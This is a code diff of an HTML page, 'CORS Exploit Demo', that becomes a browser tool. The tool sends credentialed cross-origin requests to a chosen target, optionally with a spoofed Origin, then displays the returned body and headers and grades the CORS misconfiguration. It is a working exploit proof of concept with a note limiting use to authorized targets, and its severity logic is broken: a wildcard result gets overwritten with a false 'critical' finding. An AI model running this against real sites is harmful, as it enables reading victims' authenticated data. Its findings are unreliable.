@@ -1,36 +1,417 @@
 <!DOCTYPE html>
-<html>
+<html lang="vi">
 <!--
 	Author: Johto Robbie
 	My Website: https://vnhackernews.com/
 	Fanpage: https://www.facebook.com/VNHackerNews/
 	Licenses: https://opensource.org/licenses/MIT
+
+	Đổi TARGET_URL thành endpoint đã được ủy quyền kiểm thử
 -->
+<head>
+  <meta charset="UTF-8">
+  <title>CORS Exploit Demo</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; }
+
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: #0d1117;
+      color: #c9d1d9;
+      margin: 0;
+      padding: 24px;
+    }
+
+    h2 { color: #ff6b6b; margin-bottom: 4px; }
+    .subtitle { color: #8b949e; font-size: 13px; margin-bottom: 20px; }
+
+    .config-box {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 16px;
+    }
+    .config-box label { display: block; font-size: 13px; color: #8b949e; margin-bottom: 4px; }
+    .config-box input, .config-box select {
+      width: 100%;
+      padding: 8px 10px;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      color: #c9d1d9;
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
+    .config-row { display: flex; gap: 12px; align-items: center; margin-bottom: 10px; }
+    .config-row input[type="text"] { flex: 1; margin-bottom: 0; }
+    .config-row select { width: 140px; margin-bottom: 0; }
+
+    .toggle-row {
+      display: flex; align-items: center; gap: 8px;
+      font-size: 13px; color: #8b949e; margin-bottom: 8px;
+    }
+    .toggle-row input[type="checkbox"] { width: 15px; height: 15px; cursor: pointer; }
+
+    .btn-exploit {
+      padding: 10px 28px;
+      background: #ff6b6b;
+      border: none; border-radius: 6px;
+      color: #fff; font-size: 15px; font-weight: bold;
+      cursor: pointer; transition: background 0.2s;
+    }
+    .btn-exploit:hover { background: #e05555; }
+    .btn-exploit:disabled { background: #555; cursor: not-allowed; }
+
+    /* Output panel */
+    .output-panel {
+      margin-top: 20px;
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .output-tabs { display: flex; border-bottom: 1px solid #30363d; }
+    .output-tab {
+      padding: 8px 18px;
+      cursor: pointer;
+      font-size: 13px;
+      color: #8b949e;
+      border: none;
+      background: transparent;
+      transition: color 0.15s;
+    }
+    .output-tab.active { color: #ff6b6b; border-bottom: 2px solid #ff6b6b; }
+    .output-tab:hover:not(.active) { color: #c9d1d9; }
+
+    .output-pane {
+      display: none;
+      padding: 14px;
+    }
+    .output-pane.active { display: block; }
+
+    pre {
+      margin: 0;
+      font-family: 'Consolas', monospace;
+      font-size: 13px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      color: #c9d1d9;
+      max-height: 360px;
+      overflow-y: auto;
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: bold;
+      margin-left: 8px;
+    }
+    .badge-ok  { background: #1a4731; color: #3fb950; }
+    .badge-err { background: #4a1419; color: #ff6b6b; }
+    .badge-warn { background: #3d2b0a; color: #e3b341; }
+
+    /* CORS header highlight */
+    .hl-cors { color: #79c0ff; font-weight: bold; }
+    .hl-key  { color: #d2a8ff; }
+    .hl-val  { color: #a5d6ff; }
+    .hl-status-ok  { color: #3fb950; }
+    .hl-status-err { color: #ff6b6b; }
+
+    .spinner {
+      display: inline-block; width: 14px; height: 14px;
+      border: 2px solid #8b949e;
+      border-top-color: #ff6b6b;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      vertical-align: middle; margin-right: 6px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .finding-box {
+      background: #1a2332;
+      border-left: 3px solid #ff6b6b;
+      border-radius: 4px;
+      padding: 10px 14px;
+      font-size: 13px;
+      line-height: 1.7;
+    }
+    .finding-box.safe { border-left-color: #3fb950; }
+  </style>
+</head>
 <body>
 
-<h3>CORS Exploit Demo</h3>
+<h2>⚠ CORS Exploit Demo</h2>
+<div class="subtitle">Authorized security assessment tool — chỉ sử dụng trên target đã được cấp phép</div>
 
-<button onclick="exploit()">Exploit</button>
+<!-- Cấu hình request -->
+<div class="config-box">
+  <div class="config-row">
+    <select id="selMethod">
+      <option>GET</option>
+      <option>POST</option>
+      <option>PUT</option>
+      <option>DELETE</option>
+    </select>
+    <input type="text" id="targetUrl"
+           value="http://domainexploit.name/api/userinfo"
+           placeholder="Target URL" />
+  </div>
 
-<pre id="out">Waiting...</pre>
+  <label>Custom Request Header (tùy chọn — dùng để test Vary: Origin)</label>
+  <input type="text" id="customHeader" placeholder='Origin: https://evil.attacker.com' />
+
+  <div class="toggle-row">
+    <input type="checkbox" id="chkCreds" checked />
+    <span>Gửi kèm Cookie / Credentials (<code>withCredentials = true</code>)</span>
+  </div>
+  <div class="toggle-row">
+    <input type="checkbox" id="chkAutoOrigin" checked />
+    <span>Tự đặt <code>Origin</code> header bằng origin của trang này</span>
+  </div>
+</div>
+
+<button class="btn-exploit" id="btnExploit" onclick="runExploit()">🚀 Exploit</button>
+
+<!-- Output -->
+<div class="output-panel" id="outputPanel" style="display:none">
+  <div class="output-tabs">
+    <button class="output-tab active" onclick="switchTab('tab-summary')">Summary</button>
+    <button class="output-tab" onclick="switchTab('tab-headers')">Response Headers</button>
+    <button class="output-tab" onclick="switchTab('tab-body')">Response Body</button>
+    <button class="output-tab" onclick="switchTab('tab-raw')">Raw Log</button>
+  </div>
+  <div class="output-pane active" id="tab-summary"><pre id="out-summary">—</pre></div>
+  <div class="output-pane" id="tab-headers"><pre id="out-headers">—</pre></div>
+  <div class="output-pane" id="tab-body"><pre id="out-body">—</pre></div>
+  <div class="output-pane" id="tab-raw"><pre id="out-raw">—</pre></div>
+</div>
 
 <script>
-function exploit() {
-    document.getElementById("out").innerText = "Sending request...";
+/* ─────────── helpers ─────────── */
+function switchTab(id) {
+  document.querySelectorAll('.output-pane').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.output-tab').forEach(t => t.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  event.target.classList.add('active');
+}
 
-    var xhr = new XMLHttpRequest();
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-            document.getElementById("out").innerText =
-                "Status: " + xhr.status + "\n\n" + xhr.responseText;
-        }
-    };
+function esc(s) {
+  return String(s)
+    .replace(/&/g,'&amp;')
+    .replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;');
+}
 
-    // change http://domainexploit.name to vulnerability domain 
-    xhttp.open("GET", "http://domainexploit.name",true);
-    xhr.send();
+function setHTML(id, html) {
+  document.getElementById(id).innerHTML = html;
+}
+
+function ts() {
+  return new Date().toISOString();
+}
+
+/* ─────────── exploit ─────────── */
+function runExploit() {
+  const btn     = document.getElementById('btnExploit');
+  const url     = document.getElementById('targetUrl').value.trim();
+  const method  = document.getElementById('selMethod').value;
+  const useCreds = document.getElementById('chkCreds').checked;
+  const autoOrigin = document.getElementById('chkAutoOrigin').checked;
+  const customHeaderRaw = document.getElementById('customHeader').value.trim();
+
+  if (!url) { alert('Nhập Target URL trước.'); return; }
+
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner"></span> Đang gửi...';
+
+  document.getElementById('outputPanel').style.display = '';
+
+  const rawLog = [];
+  rawLog.push('[' + ts() + '] REQUEST');
+  rawLog.push('Method  : ' + method);
+  rawLog.push('URL     : ' + url);
+  rawLog.push('withCredentials: ' + useCreds);
+  if (autoOrigin) rawLog.push('Origin  : ' + location.origin + '  (tự động)');
+  if (customHeaderRaw) rawLog.push('Custom  : ' + customHeaderRaw);
+
+  const xhr = new XMLHttpRequest();
+  xhr.open(method, url, true);
+  xhr.withCredentials = useCreds;
+
+  // Gắn header tuỳ chỉnh nếu có (vd: Origin giả mạo để test Vary)
+  if (customHeaderRaw) {
+    try {
+      const [k, ...rest] = customHeaderRaw.split(':');
+      xhr.setRequestHeader(k.trim(), rest.join(':').trim());
+    } catch(e) {
+      rawLog.push('[WARN] Không thể gắn header: ' + e.message);
+    }
+  }
+
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState !== 4) return;
+
+    btn.disabled = false;
+    btn.innerHTML = '🚀 Exploit';
+
+    const status  = xhr.status;
+    const rawHdrs = xhr.getAllResponseHeaders() || '';
+    const body    = xhr.responseText || '';
+
+    rawLog.push('\n[' + ts() + '] RESPONSE');
+    rawLog.push('HTTP Status: ' + status + ' ' + xhr.statusText);
+    rawLog.push('--- Response Headers ---');
+    rawLog.push(rawHdrs || '(không lấy được — trình duyệt chặn do CORS)');
+    rawLog.push('--- Body ---');
+    rawLog.push(body || '(empty)');
+
+    /* ── parse headers ── */
+    const hdrsMap = {};
+    rawHdrs.split('\r\n').forEach(line => {
+      const idx = line.indexOf(':');
+      if (idx > 0) {
+        const k = line.slice(0,idx).trim().toLowerCase();
+        const v = line.slice(idx+1).trim();
+        hdrsMap[k] = v;
+      }
+    });
+
+    const acao  = hdrsMap['access-control-allow-origin']      || '';
+    const acac  = hdrsMap['access-control-allow-credentials'] || '';
+    const acam  = hdrsMap['access-control-allow-methods']     || '';
+    const acah  = hdrsMap['access-control-allow-headers']     || '';
+    const aceh  = hdrsMap['access-control-expose-headers']    || '';
+    const vary  = hdrsMap['vary']                              || '';
+
+    /* ── đánh giá mức độ ── */
+    let finding = '';
+    let findingClass = '';
+
+    if (status === 0 || (status >= 200 && !acao)) {
+      // Không lấy được headers — bị block hoặc network error
+      finding = `<b>❌ Bị chặn bởi SOP / CORS policy (hoặc network error)</b>\n\n`
+              + `Trình duyệt không cho phép đọc response body.\n`
+              + `Status = ${status} — không có <code>Access-Control-Allow-Origin</code> trong response,\n`
+              + `hoặc server không trả về, hoặc request không reach được target.\n\n`
+              + `→ Endpoint KHÔNG dính CORS misconfiguration với origin này.`;
+      findingClass = 'safe';
+    } else if (acao === '*' && useCreds) {
+      finding = `<b>⚠ CORS wildcard (*) kết hợp withCredentials=true — trình duyệt sẽ block</b>\n\n`
+              + `<code>Access-Control-Allow-Origin: *</code> không hợp lệ khi <code>withCredentials=true</code>.\n`
+              + `Trình duyệt từ chối trả response cho JS. Credentials không bị lộ qua vector này.\n`
+              + `→ Không khai thác được bằng vector credentialed.`;
+      findingClass = 'safe';
+    } else if (acao === '*') {
+      finding = `<b>🟡 CORS Wildcard — Medium (không có Credentials)</b>\n\n`
+              + `<code>Access-Control-Allow-Origin: *</code> cho phép bất kỳ origin nào đọc response.\n`
+              + `Nếu endpoint trả dữ liệu công khai thì ít nguy hiểm;\n`
+              + `nguy hiểm nếu endpoint trả data nhạy cảm không cần xác thực\n`
+              + `(public API key, internal config, non-auth sensitive data).`;
+      findingClass = 'warn';
+      finding = `<b>🔴 CRITICAL — Origin Reflected + Credentials Allowed</b>\n\n`
+              + `<code>Access-Control-Allow-Origin</code>: <b>${esc(acao)}</b>\n`
+              + `<code>Access-Control-Allow-Credentials</code>: <b>${esc(acac)}</b>\n\n`
+              + `Server reflect nguyên origin của attacker và cho phép credentials.\n`
+              + `→ Cookie / session token của nạn nhân bị đọc toàn bộ từ trang attacker!\n\n`
+              + `CVSS v3.1 ≈ 8.1 (High) nếu authenticated endpoint.`;
+      findingClass = '';
+    }
+
+    // Phân biệt reflected origin (nguy hiểm nhất)
+    if (acao && acao !== '*') {
+      if (acac.toLowerCase() === 'true') {
+        finding = `<b>🔴 CRITICAL — Origin Reflected + Credentials Allowed</b>\n\n`
+                + `<code>Access-Control-Allow-Origin</code>: <b>${esc(acao)}</b>\n`
+                + `<code>Access-Control-Allow-Credentials</code>: <b>${esc(acac)}</b>\n\n`
+                + `Server reflect nguyên origin của attacker và cho phép credentials.\n`
+                + `→ Cookie / session token của nạn nhân bị đọc toàn bộ từ trang attacker!\n\n`
+                + `CVSS v3.1 ≈ 8.1 (High) nếu authenticated endpoint.`;
+        findingClass = '';
+      } else {
+        finding = `<b>🟡 CORS — Origin Reflected nhưng không có Credentials</b>\n\n`
+                + `<code>Access-Control-Allow-Origin</code>: <b>${esc(acao)}</b>\n`
+                + `<code>Access-Control-Allow-Credentials</code>: <b>${esc(acac) || 'không có'}</b>\n\n`
+                + `Response body có thể đọc được nhưng không kèm cookie/session.\n`
+                + `→ Nguy hiểm nếu endpoint trả data nhạy cảm không cần xác thực.`;
+        findingClass = 'warn';
+      }
+    }
+
+    if (!finding) {
+      finding = `Status: ${status}\nACAO: ${acao || '(không có)'} | ACAC: ${acac || '(không có)'}`;
+    }
+
+    /* ── render Summary ── */
+    const statusColor = (status >= 200 && status < 300) ? 'hl-status-ok' : 'hl-status-err';
+    setHTML('out-summary',
+      `<div class="finding-box ${findingClass}">${finding}</div>\n\n`
+    + `<span class="${statusColor}">HTTP ${status} ${esc(xhr.statusText)}</span>\n`
+    + `URL    : ${esc(url)}\n`
+    + `Method : ${method}\n`
+    + `withCredentials : ${useCreds}\n`
+    + `Body length : ${body.length} bytes`
+    );
+
+    /* ── render Headers ── */
+    let hdrsHtml = '';
+    rawHdrs.split('\r\n').forEach(line => {
+      if (!line) return;
+      const idx = line.indexOf(':');
+      if (idx < 0) { hdrsHtml += esc(line) + '\n'; return; }
+      const k = line.slice(0,idx);
+      const v = line.slice(idx+1).trim();
+      const isCors = k.toLowerCase().startsWith('access-control');
+      hdrsHtml += (isCors
+        ? `<span class="hl-cors">${esc(k)}</span>: <span class="hl-val">${esc(v)}</span>`
+        : `<span class="hl-key">${esc(k)}</span>: ${esc(v)}`)
+        + '\n';
+    });
+    setHTML('out-headers', hdrsHtml || '<span style="color:#8b949e">(không lấy được headers — bị block bởi trình duyệt)</span>');
+
+    /* ── render Body ── */
+    let bodyHtml = '';
+    if (!body) {
+      bodyHtml = '<span style="color:#8b949e">(empty — bị block bởi SOP hoặc server trả về rỗng)</span>';
+    } else {
+      // Thử pretty-print JSON
+      try {
+        const j = JSON.parse(body);
+        bodyHtml = esc(JSON.stringify(j, null, 2));
+      } catch(_) {
+        bodyHtml = esc(body);
+      }
+    }
+    setHTML('out-body', bodyHtml);
+
+    /* ── render Raw ── */
+    setHTML('out-raw', esc(rawLog.join('\n')));
+
+    // Auto-switch sang tab thú vị nhất
+    if (body) switchTab('tab-body');
+    else      switchTab('tab-summary');
+  };
+
+  xhr.onerror = function () {
+    btn.disabled = false;
+    btn.innerHTML = '🚀 Exploit';
+    rawLog.push('[' + ts() + '] NETWORK ERROR — request không reach được target');
+    document.getElementById('outputPanel').style.display = '';
+    setHTML('out-summary',
+      '<div class="finding-box safe">'
+    + '<b>❌ Network Error</b>\n\n'
+    + 'Request không gửi được (sai URL, server down, hoặc trình duyệt block preflight).\n'
+    + 'Kiểm tra URL và xem DevTools → Network để biết chi tiết.'
+    + '</div>'
+    );
+    switchTab('tab-summary');
+    setHTML('out-raw', esc(rawLog.join('\n')));
+  };
+
+  xhr.send();
 }
 </script>
-
 </body>
 </html>
